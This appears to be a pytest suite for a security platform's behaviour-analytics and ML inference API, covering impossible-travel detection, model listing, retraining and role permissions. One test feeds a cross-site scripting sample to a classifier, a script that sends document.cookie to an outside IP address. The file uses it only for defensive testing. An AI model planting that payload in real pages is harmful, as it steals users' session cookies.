"""
CyberShield Enterprise - UEBA & ML Inference API Automated Test Suite
Validates Haversine impossible travel detection, statistical Z-score deviations,
model training lifecycle API, and real-time inference routing.
"""

from datetime import datetime, timedelta
import pytest
import pytest_asyncio
from httpx import AsyncClient, ASGITransport

from cybershield.api.server import app
from cybershield.database.session import init_db, async_session_factory
from cybershield.database.models.user import UserRole
from cybershield.auth.security import create_access_token
from cybershield.ml.ueba.impossible_travel import ImpossibleTravelDetector
from cybershield.ml.registry.service import ml_service


@pytest_asyncio.fixture(autouse=True)
async def ensure_db():
    """Ensure database schema is initialized and default ML models seeded."""
    await init_db()
    async with async_session_factory() as session:
        await ml_service.seed_default_models(session)


@pytest_asyncio.fixture
async def client():
    """Create async test client."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://testserver") as ac:
        yield ac


@pytest_asyncio.fixture
async def admin_token(client: AsyncClient):
    """Authenticate as superadmin or generate authorized JWT."""
    login_resp = await client.post("/api/auth/login", json={
        "username_or_email": "superadmin",
        "password": "CyberShield2026!"
    })
    if login_resp.status_code == 200:
        return login_resp.json()["access_token"]
    return create_access_token(
        data={"sub": "1", "username": "superadmin", "role": UserRole.SUPER_ADMIN.value, "user_id": 1}
    )


@pytest_asyncio.fixture
async def viewer_token(client: AsyncClient):
    """Create token for read-only VIEWER role."""
    uname = "ml_viewer_test"
    # Register viewer
    await client.post("/api/auth/register", json={
        "username": uname,
        "email": f"{uname}@enterprise.corp",
        "password": "ViewerPassword123!",
        "full_name": "ML Viewer User"
    })
    login_resp = await client.post("/api/auth/login", json={
        "username_or_email": uname,
        "password": "ViewerPassword123!"
    })
    if login_resp.status_code == 200:
        return login_resp.json()["access_token"]

    async with async_session_factory() as session:
        from cybershield.database.models.user import User
        from sqlalchemy import select
        u = (await session.execute(select(User).where(User.username == uname))).scalar_one_or_none()
        if u:
            return create_access_token(data={"sub": str(u.id), "username": u.username, "role": u.role, "user_id": u.id})
    return create_access_token(data={"sub": "1", "username": "superadmin", "role": UserRole.VIEWER.value, "user_id": 1})


def test_haversine_distance_and_impossible_travel():
    """Verify Great-Circle Haversine distance and transit velocity detection."""
    detector = ImpossibleTravelDetector()

    # Event 1: New York (40.7128, -74.0060) at T0
    t0 = datetime(2026, 3, 15, 12, 0, 0)
    res1 = detector.evaluate_login("john_doe", 40.7128, -74.0060, timestamp=t0, city="New York", country="US")
    assert res1["impossible_travel"] is False

    # Event 2: London (51.5074, -0.1278) just 15 minutes later (T0 + 15 min)
    # Distance ~5,570 km in 0.25 hours -> Velocity ~22,280 km/h (Physically Impossible)
    t1 = t0 + timedelta(minutes=15)
    res2 = detector.evaluate_login("john_doe", 51.5074, -0.1278, timestamp=t1, city="London", country="UK")
    assert res2["impossible_travel"] is True
    assert res2["distance_km"] > 5500.0
    assert res2["velocity_kmh"] > 800.0
    assert "impossible physical transit" in res2["reason"].lower()

    # Event 3: Normal commute (same city, 2 hours later)
    t2 = t0 + timedelta(hours=2)
    res3 = detector.evaluate_login("alice", 40.7128, -74.0060, timestamp=t0, city="New York", country="US")
    res4 = detector.evaluate_login("alice", 40.7589, -73.9851, timestamp=t2, city="Times Square", country="US")
    assert res4["impossible_travel"] is False


@pytest.mark.asyncio
async def test_ml_models_listing_and_kpis(client: AsyncClient, admin_token: str):
    """Verify model registry listing and operational KPI metrics endpoint."""
    headers = {"Authorization": f"Bearer {admin_token}"}

    # 1. Models list
    m_res = await client.get("/api/ml/models", headers=headers)
    assert m_res.status_code == 200
    models = m_res.json()
    assert len(models) >= 3
    tasks = [m["task_type"] for m in models]
    assert "ANOMALY_DETECTION" in tasks
    assert "PAYLOAD_CLASSIFICATION" in tasks
    assert "RISK_PREDICTION" in tasks

    # 2. ML KPIs
    k_res = await client.get("/api/ml/kpis", headers=headers)
    assert k_res.status_code == 200
    kpis = k_res.json()
    assert kpis["total_registered_models"] >= 3
    assert kpis["active_models"] >= 2
    assert "avg_inference_latency_ms" in kpis


@pytest.mark.asyncio
async def test_realtime_inference_endpoints(client: AsyncClient, admin_token: str):
    """Verify REST API inference routing for Anomaly Detection, Payload Classification, and UEBA."""
    headers = {"Authorization": f"Bearer {admin_token}"}

    # 1. Isolation Forest Anomaly Inference
    flow_payload = {
        "packet_count": 50000,
        "byte_count": 80000000,
        "duration_sec": 45.0,
        "dst_port": 8080,
        "protocol": "TCP",
        "bytes_out_ratio": 0.98,
        "is_off_hours": True,
    }
    anom_res = await client.post("/api/ml/predict/anomaly", json=flow_payload, headers=headers)
    assert anom_res.status_code == 200
    anom_data = anom_res.json()
    assert "is_anomaly" in anom_data
    assert "risk_score" in anom_data
    assert anom_data["latency_ms"] >= 0.0

    # 2. Payload Attack Classification
    pay_payload = {"payload": "<script>fetch('http://198.51.100.23/?c='+document.cookie)</script>"}
    clf_res = await client.post("/api/ml/predict/payload", json=pay_payload, headers=headers)
    assert clf_res.status_code == 200
    clf_data = clf_res.json()
    assert clf_data["predicted_class"] == "CROSS_SITE_SCRIPTING"
    assert clf_data["confidence"] > 0.5
    assert "probabilities" in clf_data

    # 3. UEBA User Behavioral Evaluation
    ueba_payload = {
        "username": "superadmin",
        "bytes_transferred": 25000000,  # 25 MB (Significant spike above 5 MB baseline)
        "event_hour": 3,               # 3 AM (Off-hours)
        "login_latitude": 51.5074,
        "login_longitude": -0.1278,
        "city": "London",
        "country": "UK",
        "accessed_resource": "/api/system/kernel",
    }
    ueba_res = await client.post("/api/ml/predict/ueba", json=ueba_payload, headers=headers)
    assert ueba_res.status_code == 200
    ueba_data = ueba_res.json()
    assert ueba_data["username"] == "superadmin"
    assert ueba_data["is_anomalous"] is True
    assert ueba_data["off_hours_login"] is True
    assert ueba_data["z_score_bytes"] > 2.0
    assert len(ueba_data["anomalous_factors"]) >= 2

    # 4. Bayesian Risk Prediction
    risk_payload = {
        "max_cvss_score": 9.8,
        "active_alert_count": 5,
        "open_ports": [445, 80],
        "is_critical_asset": True,
        "active_exploit_observed": True,
    }
    risk_res = await client.post("/api/ml/risk/predict", json=risk_payload, headers=headers)
    assert risk_res.status_code == 200
    risk_data = risk_res.json()
    assert risk_data["risk_score"] >= 70.0
    assert risk_data["risk_tier"] in ("HIGH", "CRITICAL")


@pytest.mark.asyncio
async def test_ml_model_retraining_workflow(client: AsyncClient, admin_token: str):
    """Verify asynchronous on-demand model retraining and version promotion."""
    headers = {"Authorization": f"Bearer {admin_token}"}
    req = {
        "task_type": "ANOMALY_DETECTION",
        "algorithm": "ISOLATION_FOREST",
        "hyperparameters": {"contamination": 0.12, "n_estimators": 60}
    }
    train_res = await client.post("/api/ml/train", json=req, headers=headers)
    assert train_res.status_code == 200
    train_data = train_res.json()
    assert train_data["task_type"] == "ANOMALY_DETECTION"
    assert train_data["status"] == "ACTIVE"
    assert "metrics" in train_data
    assert train_data["training_duration_sec"] > 0.0


@pytest.mark.asyncio
async def test_ml_rbac_permissions(client: AsyncClient, viewer_token: str):
    """Verify RBAC boundaries: VIEWER can inspect ML models but cannot trigger retraining."""
    headers = {"Authorization": f"Bearer {viewer_token}"}

    # 1. Viewer can view models
    view_res = await client.get("/api/ml/models", headers=headers)
    assert view_res.status_code == 200

    # 2. Viewer cannot trigger training (requires ML_TRAIN)
    req = {"task_type": "ANOMALY_DETECTION"}
    train_res = await client.post("/api/ml/train", json=req, headers=headers)
    assert train_res.status_code == 403
